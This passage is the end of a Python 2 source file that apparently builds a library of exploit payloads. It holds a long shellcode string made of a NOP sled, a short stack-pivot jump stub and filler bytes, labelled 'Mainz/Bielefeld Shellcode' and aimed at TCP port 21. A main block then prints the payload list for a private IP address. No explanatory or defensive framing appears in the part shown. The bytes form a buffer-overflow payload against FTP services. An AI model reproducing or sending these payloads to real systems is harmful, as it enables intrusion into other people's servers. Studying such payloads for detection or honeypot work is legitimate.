90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00\x46\x00\x01\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xEC\x1C\x07\xFF\xE4\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x95\x14"
        shellcode += "\x40\x00\x03\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x78\x85\x13\x00\xAB\x5B\xA6\xE9\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x00"
        self.payloads.append([
            "Mainz/Bielefeld Shellcode",
            "socket",
            21,
            "tcp",
            shellcode,
            ""
            ])


        return self.payloads

if __name__ == "__main__":
    print ShellCodes("192.168.100.48").getPayloads()